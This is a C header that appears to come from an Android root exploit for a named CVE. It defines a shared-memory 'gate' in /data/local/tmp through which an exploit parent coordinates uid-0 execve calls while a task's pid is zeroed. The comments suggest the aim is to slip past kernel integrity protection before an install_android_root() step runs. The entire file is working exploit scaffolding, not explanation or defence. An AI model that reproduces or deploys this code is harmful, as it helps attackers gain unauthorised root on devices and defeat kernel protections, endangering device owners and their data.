#ifndef HKIP_GATE_H
#define HKIP_GATE_H

#include <fcntl.h>
#include <stdlib.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

/*
 * File-backed handshake so uid-0 execve can run with task->pid
 * temporarily zeroed.  The exploit parent services requests.
 * Daemon forks must request their own window (new pid).
 */

#define HKIP_GATE_PATH "/data/local/tmp/.cve43499_hkip"
/* Overridable: a stale marker left by a previous run (owned by another
 * uid/label) cannot be unlinked from the shell domain, and open(O_CREAT)
 * then fails, aborting the process before install_android_root() runs. */
#define HKIP_GATE_PATH_ENV "CVE43499_GATE"
static inline const char *hkip_gate_path(void) {
  const char *p = getenv(HKIP_GATE_PATH_ENV);
  return (p && *p) ? p : HKIP_GATE_PATH;
}
#define HKIP_GATE_SIZE 4096

struct hkip_gate {
  atomic_int go;
  atomic_int done;
  atomic_int exec_armed;
  atomic_int exec_go;
  atomic_int hkip_seq;
  atomic_int hkip_acked;
  atomic_int requester_pid;
};

static inline int hkip_gate_attach(struct hkip_gate **out) {
  int fd = open(hkip_gate_path(), O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  void *p = mmap(NULL, HKIP_GATE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  close(fd);
  if (p == MAP_FAILED) {
    return 0;
  }
  *out = p;
  return 1;
}

static inline int hkip_gate_request(struct hkip_gate *g) {
  if (!g) {
    return 0;
  }
  int seq = atomic_fetch_add(&g->hkip_seq, 1) + 1;
  atomic_store(&g->requester_pid, (int)getpid());
  atomic_store(&g->exec_armed, seq);
  for (int i = 0; i < 8000; i++) {
    if (atomic_load(&g->exec_go) == seq) {
      return 1;
    }
    usleep(1000);
  }
  return 0;
}

#endif
